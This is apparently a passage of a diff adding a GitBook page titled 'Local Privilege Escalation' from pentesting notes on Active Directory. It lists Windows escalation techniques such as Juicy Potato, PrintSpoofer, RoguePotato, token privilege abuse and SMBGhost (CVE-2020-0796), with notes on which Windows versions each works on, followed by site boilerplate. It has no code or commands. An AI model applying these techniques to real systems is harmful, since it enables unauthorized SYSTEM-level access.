+<li>Juicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation, warning Works only until Windows Server 2016 and Windows 10 until patch 1803</li>
+<li>Lovely Potato Automated Juicy Potato, warning Works only until Windows Server 2016 and Windows 10 until patch 1803</li>
+<li>PrintSpoofer Exploit the PrinterBug for System Impersonation</li>
+<li>Pray Works for Windows Server 2019 and Windows 10</li>
+<li>RoguePotato Upgraded Juicy Potato</li>
+<li>Pray Works for Windows Server 2019 and Windows 10</li>
+<li>Abusing Token Privileges</li>
+<li>SMBGhost CVE-2020-0796</li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="2.html" class="navigation navigation-prev " aria-label="Previous page: Domain Enumeration">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="user_hunt.html" class="navigation navigation-next " aria-label="Next page: User Hunting">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Local Privilege Escalation","level":"10.4","depth":1,"next":{"title":"User Hunting","level":"10.5","depth":1,"path":"active_dir/user_hunt.md","ref":"active_dir/user_hunt.md","articles":[]},"previous":{"title":"Domain Enumeration","level":"10.3","depth":1,"path":"active_dir/2.md","ref":"active_dir/2.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"active_dir/priv_esca.md","mtime":"2020-11-25T14:44:01.556Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-12-06T06:16:42.760Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
